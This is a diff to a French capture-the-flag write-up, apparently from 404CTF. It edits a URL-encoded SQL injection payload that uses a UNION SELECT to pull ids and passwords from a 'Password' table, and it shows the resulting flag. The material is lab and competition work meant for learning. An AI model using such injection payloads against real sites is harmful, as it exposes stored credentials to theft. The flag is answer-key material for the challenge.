@@ -75,7 +75,7 @@ On a trois pages du site, chacune avec son propre formulaire à injecter.
     Payload finale :
     
     
-    '%20UNION%20%53%45%4c%45%43%54%201,%20id,%20mdp%20FROM%20Password%20--%20-
+    '%20UNION%20%53%45%4c%45%43%54%201,id,mdp%20FROM%20Password%20--%20-
 
     mdp : 404CTF{GorfousAuPouvoir}
     
